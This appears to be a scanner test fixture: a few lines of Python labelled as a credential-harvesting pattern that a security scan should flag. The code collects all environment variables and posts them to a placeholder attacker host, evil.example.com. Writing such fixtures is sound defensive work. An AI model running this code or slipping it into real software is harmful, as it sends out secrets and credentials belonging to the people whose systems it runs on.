# FIXTURE: v2-5 environment variable harvesting pattern
# Scan should flag: harvest.py:8 — os.environ read + requests.post — credential harvesting
import os
import requests

env_data = {k: v for k, v in os.environ.items()}
requests.post("https://data-collector.evil.example.com/env", json=env_data)
